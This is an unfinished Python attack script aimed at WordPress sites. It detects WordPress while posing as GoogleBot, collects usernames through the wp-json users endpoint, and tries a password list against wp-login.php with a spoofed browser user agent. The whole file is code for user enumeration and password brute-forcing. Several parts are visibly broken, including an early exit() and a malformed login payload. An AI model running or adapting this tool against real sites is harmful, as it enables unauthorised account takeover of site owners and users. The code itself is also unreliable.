import json
import sys
import os
import time
import re
import random
import requests
# import threading
from bs4 import BeautifulSoup as bs
from colorama import Fore
########################### COMPLETE ME ########################################
url = sys.argv[1] if len(sys.argv) > 1 else exit(Fore.RED+f"python {sys.argv[0]} wp-url pass_list [optional]"+Fore.RESET)
psswd = sys.argv[2] if len(sys.argv) > 2 else "n"
t_a = sys.argv[3] if len(sys.argv) > 3 else 0 # try all users 
while psswd == None or os.path.exists(psswd) or sys.getsizeof(psswd) == 0:
  psswd = input("Enter the passlist: ")
validate_link = re.match(r"https?:\/\/", url)
if not validate_link:
  url = f"https://{url}"
def validate_wp(url):
  headers = {
    "User-Agent":"GoogleBot",
    "Accept":"*/*",
  }
  # look for 'generator, wp keywords'
  sendGetReq = requests.get(url, headers=headers, timeout=5)
  if sendGetReq.status_code == 200:
    parse_html = bs(sendGetReq.text, "html.parser")
    find_includes = parse_html.find_all("link")
    ISWP = False
    for x, _ in enumerate(find_includes):
      if re.match(r"^https?://+[a-zA-Z0-9]+\.[a-z]+/(wp-json|wp-content|wp-includes).+", _.attrs['href']):
        print("Wordpress detected ")
        ISWP = True
        return ISWP
    if not ISWP:
      print('Not a wordpress site')
      return False
validate_wp(url)
exit()
class CmsWP:
  def __init__(self, url, psswd, t_a): # logins 
    self.url, self.psswd, self.t_a = url , psswd, t_a
  def EnumerateUsers(self):
    # wp-json/wp/v2/users/1
    users_url = f'{url}/wp-json/wp/v2/users/'
    headers = {
      "User-Agent":"GoogleBot",
      "Accept":"*/*"
    }
    reqUsers = requests.get(users_url, headers=headers, timeout=5, allow_redirects=False)
    if reqUsers.ok:
      try:
        JSON = json.loads(reqUsers.text) # json loader::load => from a file; loads => from a string
        users_ = [_['name'] for _ in JSON if _['id'] != None] # return users  
        return users_
      except Exception as UsersError: # jsonError probably
        print(Fore.RED+f"UsersError: {UsersError}"+Fore.RESET)
        exit()
    else:
      print(reqUsers.status_code)
  user = EnumerateUsers()
  def Login(self):
    # login function, Maybe it's better to use Threading
    if psswd != "n":
      if len(user) != 0:
          try:
            with open(psswd, "r") as f:
              login_wp = url+"/wp-login.php"
              F = f.readlines()
              headers = {
                "User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.47 Mobile/15E148 Safari/604.1",
                "Referer":url+"/wp-login.php",
                "Origin":url,
                "Content-Type":"application/x-www-form-urlencoded"
              }
              # try all users
              # or try single user
              # all users , another for loop
              for _ in F:
                payload = {
                "email": user, 
                "password": _.replace("\n", ""),
                "submit": 1
                }
                reqPost = requests.post(login_wp, headers=headers, data=payload, timeout=5) # send post request
                # check the reqPost.url 
                if reqPost.status_code == 200 and reqPost.url == "/admin":
                  print(Fore.GREEN, "Good", Fore.RESET) 
                time.sleep(2) # 2s
          except Exception as LoginError:
            exit(Fore.RED+f"LoginError: {LoginError}"+Fore.RESET)
      else:
        print(Fore.RED+f"users list is empty"+Fore.RESET)
cmsWP = CmsWP(url, psswd, t_a)
cmsWP.EnumerateUsers()
cmsWP.Login()
